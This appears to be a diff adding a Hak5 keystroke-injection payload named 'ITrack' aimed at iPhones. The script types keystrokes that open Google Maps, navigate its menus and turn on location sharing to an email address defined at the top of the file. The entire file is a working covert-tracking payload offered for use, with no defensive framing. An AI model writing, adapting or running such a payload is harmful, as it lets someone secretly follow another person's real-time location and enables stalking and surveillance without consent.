@@ -1,0 +1,63 @@
+REM Title: ITrack
+REM Author: Sideswipe(@Sideswipes_Hack)
+REM Description: Enables Google Location Sharing for Email of Choice
+REM Target: IOS
+REM Props: Hak5
+REM Version: 1.2
+REM Category: Mobile
+REM Requirements: Full Keyboard Access Enabled
+
+DEFINE #EMAIL sideswipe@exmaple.com
+
+REM Default Delay optimzed for Iphone 14 Pro
+DEFAULT_DELAY 100
+DELAY 200
+
+REM Open Google Maps
+GUI h
+GUI h
+DELAY 300
+GUI SPACE
+DELAY 300
+DELETE
+STRINGLN Google Maps
+DELAY 500
+
+
+REM Navigate to Google Location Sharing Settings
+TAB
+TAB
+SPACE
+DELAY 300
+REPEAT 5:
+  DOWNARROW
+SPACE
+DELAY 400
+
+
+REM Enable Location Sharing
+DOWNARROW
+TAB
+SPACE
+DELAY 400
+TAB
+TAB
+DOWNARROW
+DEFAULT_DELAY 0
+REPEAT 12:
+  RIGHTARROW
+DOWNARROW
+REPEAT 10:
+  RIGHTARROW
+DEFAULT_DELAY 200
+DELAY 600
+SPACE
+DELAY 600
+TAB
+SPACE
+ENTER
+DEFAULT_DELAY 100
+STRINGLN #EMAIL
+REPEAT 3:
+  TAB
+SPACE
